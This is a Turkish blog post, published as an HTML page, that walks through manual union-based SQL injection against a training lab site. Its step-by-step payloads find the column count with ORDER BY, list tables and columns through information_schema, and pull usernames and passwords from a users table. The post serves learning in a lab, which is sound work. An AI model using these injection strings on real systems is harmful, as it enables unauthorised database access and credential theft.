<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->

	<title>Manuel SQL Injection</title>

	<!-- Google font -->
	<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700%7CMuli:400,700" rel="stylesheet">

	<!-- Bootstrap -->
	<link type="text/css" rel="stylesheet" href="css/bootstrap.min.css" />

	<!-- Font Awesome Icon -->
	<link rel="stylesheet" href="css/font-awesome.min.css">

	<!-- Custom stlylesheet -->
	<link type="text/css" rel="stylesheet" href="css/style.css" />

	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
		  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
		  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
		<![endif]-->

</head>

<body>
	<!-- HEADER -->
	<header id="header">
		<!-- NAV -->
		<div id="nav">
			<!-- Top Nav -->
			<div id="nav-top">
				<div class="container">
					<!-- social -->
					<ul class="nav-social">
						<li><a href="https://github.com/4lparslan" target="_blank"><img src="./img/git.png"></i></a></li>
					</ul>
					<!-- /social -->

					<!-- logo -->
					<div class="nav-logo">
						<a href="index.html" class="logo"><img src="./img/logo.png" alt=""></a>
					</div>
					<!-- /logo -->

					<!-- search & aside toggle -->
					<div class="nav-btns">
						<a href="index-en.html">English</a>
						<button class="aside-btn"><i class="fa fa-bars"></i></button>
						
						
					</div>
					<!-- /search & aside toggle -->
				</div>
			</div>
			<!-- /Top Nav -->

			<!-- Main Nav -->
			<div id="nav-bottom">
				<div class="container">
					<!-- nav -->
					<ul class="nav-menu">
						<li class="has-dropdown">
							<a href="#">Menü</a>
							<div class="dropdown">
								<div class="dropdown-body">
									<ul class="dropdown-list">
										<li><a href="#">Son Yazılar</a></li>
										<li><a href="#">Hakkımda</a></li>
										<li><a href="#">İletişim</a></li>
									</ul>
								</div>
							</div>
						</li>
						<li class="has-dropdown megamenu">
							<a href="#">Kategoriler</a>
							<div class="dropdown">
								<div class="dropdown-body">
									<!--
									<div class="row">
										<div class="col-md-3">
											<h4 class="dropdown-heading">Categories</h4>
											<ul class="dropdown-list">
												<li><a href="#">Lifestyle</a></li>
												<li><a href="#">Fashion</a></li>
												<li><a href="#">Technologyy</a></li>
												<li><a href="#">Health</a></li>
												<li><a href="#">Travel</a></li>
											</ul>
										</div>
										<div class="col-md-3">
											<h4 class="dropdown-heading">Lifestyle</h4>
											<ul class="dropdown-list">
												<li><a href="#">Lifestyle</a></li>
												<li><a href="#">Fashion</a></li>
												<li><a href="#">Health</a></li>
											</ul>
											<h4 class="dropdown-heading">Technology</h4>
											<ul class="dropdown-list">
												<li><a href="#">Lifestyle</a></li>
												<li><a href="#">Travel</a></li>
											</ul>
										</div>
										<div class="col-md-3">
											<h4 class="dropdown-heading">Fashion</h4>
											<ul class="dropdown-list">
												<li><a href="#">Fashion</a></li>
												<li><a href="#">Technology</a></li>
											</ul>
											<h4 class="dropdown-heading">Travel</h4>
											<ul class="dropdown-list">
												<li><a href="#">Lifestyle</a></li>
												<li><a href="#">Healtth</a></li>
												<li><a href="#">Fashion</a></li>
											</ul>
										</div>
										<div class="col-md-3">
											<h4 class="dropdown-heading">Health</h4>
											<ul class="dropdown-list">
												<li><a href="#">Technology</a></li>
												<li><a href="#">Fashion</a></li>
												<li><a href="#">Health</a></li>
												<li><a href="#">Travel</a></li>
											</ul>
										</div>
									</div>
									-->
								</div>
							</div>
						</li>

					</ul>
					<!-- /nav -->
				</div>
			</div>
			<!-- /Main Nav -->

			<!-- Aside Nav -->
			<div id="nav-aside">
				<ul class="nav-aside-menu">
					<li><a href="index.html">Anasayfa</a></li>
					<li class="has-dropdown"><a>Kategoriler</a>
						<ul class="dropdown">
							<li><a href="#">Programlama</a></li>
							<li><a href="#">Siber Güvenlik</a></li>
							<li><a href="#">Kamp-Eğitim</a></li>
						</ul>
					</li>
					<li><a href="#">Hakkımda</a></li>
					<li><a href="#">İletişim</a></li>
				</ul>
				<button class="nav-close nav-aside-close"><span></span></button>
			</div>
			<!-- /Aside Nav -->
		</div>
		<!-- /NAV -->

		<!-- PAGE HEADER -->
		<div id="post-header" class="page-header">
			<div class="page-header-bg" style="background-image: url('./img/sqlInjection.jpg');" data-stellar-background-ratio="0.5"></div>
			<div class="container">
				<div class="row">
					<div class="col-md-10">
						<div class="post-category">
							<a href="#">siber güvenlik </a><a href="#"> sızma testi</a>
						</div>
						<h1>Manuel SQL Injection</h1>
						<ul class="post-meta">
							<li><a href="author.html">Alparslan İdrİs Arslan</a></li>
							<li>16 Temmuz 2019</li>
						</ul>
					</div>
				</div>
			</div>
		</div>
		<!-- /PAGE HEADER -->
	</header>
	<!-- /HEADER -->

	<!-- section -->
	<div class="section">
		<!-- container -->
		<div class="container">
			<!-- row -->
			<div class="row">
				<div class="col-md-8">
					

					<!-- post content -->
					<div class="section-row">
						<h3>SQL Injection ne demek, manuel olması ne anlama geliyor?</h3>
						<p>Veritabanına bağlı çalışan web uygulamalarına yönelik bir atak türü olup, birkaç çeşidi vardır:</p>
						<ul class="list-style">
							<li>Union Based</li>
							<li>Error Based</li>
							<li>Blind
							<ul class="list-style" style="list-style-type: circle">
								<li>Boolean Based</li>
								<li>Time Based</li>
							</ul>
							</li>
						</ul>
						<p>SQL-I, SQL sorgusuna müdahale etme yoluyla zafiyeti sömürme işlemidir. Kimlik doğrulama bypass edilerek veritabanıyla bağlantı kurulur. Veritabanında istenen değişiklikler yapılabilir, veritabanından veri çekilebilir.</p>
						<p>Linux cihaz üzerinden SQLMap ve daha birçok araç ile otomatize bir şekilde gerçekleştirilebilir.Bu yazıda ise tamamıyla kendimiz; SQL sorgularını birleştirerek, deneme yanılma yoluyla veritabanı hakkında bilgi toplamaya çalışacağız.</p>
						<h3>Neler gerekli?</h3>
						<p>Gerekli önlemleri almamış, alınan inputları filtrelememiş bir PHP site işimizi görür. Ben bu yazımda, <a target="_blank" href="https://www.aucyberclub.org/">AUCC</a> eğitimlerinde bize sunulan lab üzerinden anlatım yapacağım. Lab, MySQL sunucuya bağlı olarak çalışıyor. Test lab için <a target="_blank" href="http://www.dvwa.co.uk/">şu </a>siteyi kullanabilirsiniz. Sonraki yazılarımda DVWA üzerine saldırılardan bahsedeceğim. Ayrıca, yapılan işlemleri daha iyi kavramak adına SQL dilinin çalışma mantığı <a target="_blank" href="https://www.w3schools.com/sql/">şuradan</a> incelenebilir.</p>
						<h3>Başlıyoruz</h3>
						<p>Öncelikle anasayfaya geliyoruz.</p>
						<figure>
							<code>sqli.hackeregitim.com/index.php</code>
						</figure>
						<p>Daha sonra, "id=2" benzeri bir ifade içeren URL keşfedene kadar siteyi kurcalıyoruz. Karşımıza şu sayfa geliyor:</p>
						<figure>
							<code>sqli.hackeregitim.com/creators.php?name=Huseyin</code>
						</figure>
						<p>"name=Huseyin" ifadesi dikkatimizi çekiyor. Şimdi URL sonuna tırnak işareti ekleyerek sözdizimini bozalım ve sayfayı yenileyelim.</p>
						<figure>
							<code>sqli.hackeregitim.com/creators.php?name=Huseyin'</code>
						</figure>
						<p> Eğer bize aşağıdaki gibi bir hata mesajı döndürürse sitenin zafiyetli olduğunu düşünebiliriz.</p>
						<figure>
							<img src="./img/sql1.png">
						</figure>
						<p>Şimdi sırada bruteforce var. Sütun sayısını bulmak için 1'den n'ye kadar sayılar yazarak aşağıdaki komutu vermemiz gerekiyor. Sondaki tire işaretleri sözdiziminin sağlanması için ekleniyor.</p>
						<figure>
							<code>sqli.hackeregitim.com/creators.php?name=Huseyin' ORDER BY 1,2,3,4,5,5,6,7-- -</code>
						</figure>
						<p>Bu denememizde şöyle bir hata ile karşılaşıyoruz.</p>
						<figure>
							<img src="./img/sql2.png">
						</figure>
						<p>7. sütunun bulunmadığını öğreniyoruz, o halde sayımızı bir eksilterek tekrar deneyelim.</p>
						<figure>
							<code>sqli.hackeregitim.com/creators.php?name=Huseyin' ORDER BY 1,2,3,4,5,5,6-- -</code>
						</figure>
						<figure>
							<img src="./img/sql3.png">
						</figure>
						<p>Ve bingo! Sayfa normal olarak yüklendi, herhangi bir hata mesajı almadık. 6 sütun bulunduğu bilgisini cebimize koyarak devam ediyoruz.</p>
						<p>Çoklu seçim yapmak için "union" ifadesini, birçok veriyi birleştirerek bir arada görüntülemek için "concat" fonksiyonunu kullanıyoruz. "information_schema" varsayılan olarak bulunan bir veritabanıdır. Sahip olunan diğer tüm veritabanlarıyla ilgili bilgileri içerir. Dolayısıyla ondan tablo isimlerini istiyoruz. "1,2,3,4,5,6" şeklindeki ifadede "1" yerine fonksiyonumuzu yazarak (Herhangi birisinin yerine yazılabilir.) veritabanının bize istediğimiz sonuçları döndürmesini sağlıyoruz.</p>
						<p>(Fazla yer kaplamaması için URL'in diğer kısmını yazmayacağım.)</p>
					 <figure>
							<code>=Huseyin' union select concat(table_name),2,3,4,5,5,6 from information_schema.tables-- -</code>
						</figure>
						<p>Veritabanında bulunan bazı dizi elemanlarını görüntülüyoruz. Bunlar tüm veritabanında mevcut olan tablo isimleri.</p>
						<figure>
							<img src="./img/sql4.png">
						</figure>
						<p>"users" adında bir tablo adı olduğunu öğreniyoruz, belki işimize yarar.</p>
						<figure>
							<img src="./img/sql5.png">
						</figure>
						<p>Benzer şekilde, "information_schema" veritabanından sütun isimlerini istiyoruz.</p>
						<figure>
							<code>=Huseyin' union select concat(column_name),2,3,4,5,5,6 from information_schema.columns-- -</code>
						</figure>
						<p>Tekrar dizi elemanları karşılıyor bizi. Bu sefer de "username" ve "password" adında iki sütun adı olduğunu öğreniyoruz.</p>
						<figure>
							<img src="./img/sql6.png">
						</figure>
						<p>İşimize yarayabilecek önemli bilgiler büyük ihtimalle "username" ve "password" kolonlarında yer almakta. Son hamleyi yapma vakti. Concat fonksiyonu sayesinde parola ve kullanıcı adını bir arada alacağız. "users" tablosundan "username" ve "password" sütunlarındaki bilgileri istiyoruz.</p>
						<figure>
							<code>=Huseyin' union select concat(username," ",password),2,3,4,5,5,6 from users-- -</code>
						</figure>
						<p>Ve nihayet kullanıcı adı ve parolayı elde ediyoruz:</p>
						<figure>
							<img src="./img/sql7.png">
						</figure>
						<p>Karşılaştığım lab senaryosunun SQL Injection kısmı bu şekildeydi. Özetle; SQL diline az çok hakim birisi olarak, URL üzerinde sözdizimi kurallarını suistimal ederek, veritabanındaki bazı kritik tablo ve kolon isimlerini öğrendik. Daha sonra kullanıcı giriş bilgilerini çekerek saldırıyı tamamladık.</p>
					</div>
					<!-- /post content -->

					<!-- post tags -->
					<div class="section-row">
						<div class="post-tags">
							<ul>
								<li></li>>>>
								<li><a href="#">Siber Güvenlik</a></li>
								<li><a href="#">sızma testi</a></li>
							</ul>
						</div>
					</div>
					<!-- /post tags -->

					

					

					

					

				</div>
				<div class="col-md-4">
					

					

					

					


					

					
				</div>
			</div>
			<!-- /row -->
		</div>
		<!-- /container -->
	</div>
	<!-- /SECTION -->

	<!-- FOOTER -->
	<footer id="footer">
		<!-- container -->
		<div class="container">
			<!-- row -->
			<div class="row">
				<div class="col-md-3">
					<div class="footer-widget">
						<div class="footer-logo">
							<a href="index.html" class="logo"><img src="./img/logo-alt.png" alt=""></a>
						</div>
						<ul class="contact-social">
							<li><a target="_blank" href="https://github.com/4lparslan" class="social-facebook"><i class="fa fa-github" ></i></a></li> -> Github Sayfam
						</ul>
					</div>
				</div>
				
				<div class="col-md-3">
					<div class="footer-widget">
						<div class="tags-widget">
							<ul>
								<li><a href="#">Programlama</a></li>
								<li><a href="#">Sızma Testi</a></li>
								<li><a href="#">Kriptoloji</a></li>
								<li><a href="#">Siber Güvenlik</a></li>
								<li><a href="#">Teknoloji</a></li>
							</ul>
						</div>
					</div>
				</div>
				
			</div>
			<!-- /row -->

			<!-- row -->
			<div class="footer-bottom row">
				<div class="col-md-6 col-md-push-6">
					<ul class="footer-nav">
						<li><a href="index.html">Anasayfa</a></li>
						<li><a href="#">Hakkımda</a></li>
						<li><a href="#">İletişim</a></li>
					</ul>
				</div>
				<div class="col-md-6 col-md-pull-6">
					-Alparslan İdris Arslan-
					<div class="footer-copyright">
						<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="fa fa-heart-o" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank">Colorlib</a>
<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
					</div>
				</div>
			</div>
			<!-- /row -->
		</div>
		<!-- /container -->
	</footer>
	<!-- /FOOTER -->

	<!-- jQuery Plugins -->
	<script src="js/jquery.min.js"></script>
	<script src="js/bootstrap.min.js"></script>
	<script src="js/jquery.stellar.min.js"></script>
	<script src="js/main.js"></script>

</body>

</html>
